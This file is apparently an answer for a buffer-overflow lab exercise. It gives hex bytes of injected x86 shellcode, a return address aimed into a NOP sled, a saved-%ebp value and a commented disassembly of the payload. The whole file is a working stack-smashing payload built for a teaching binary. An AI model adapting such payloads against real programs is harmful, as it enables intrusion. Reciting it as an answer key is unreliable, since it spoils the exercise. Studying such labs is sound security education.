8d 6c 24 28  /* 0x55683900 */ /* start my byte code  */
b8 aa a6 94 
20 68 2e 8c
04 08 c3 00  /* end of my byte code */ 

00 00 00 00  /* recover %ebp to 0x 55 68 39 40 */

34 38 68 55  /* set the return addr to 0x55683834, this is the mid of NOP Sled */

 /* Global_val addr is 0x804c1ec  */
 /* correct return addr is 0x08048c93 */
 /*   0:	8d 6c 24 28          	lea    0x28(%esp),%ebp        */
 /*   4:	b8 aa a6 94 20       	mov    $0x2094a6aa,%eax       */
 /*   9:	68 2e 8c 04 08       	push   $0x8048c2e             */
 /*   e:	c3                   	ret                           */

  
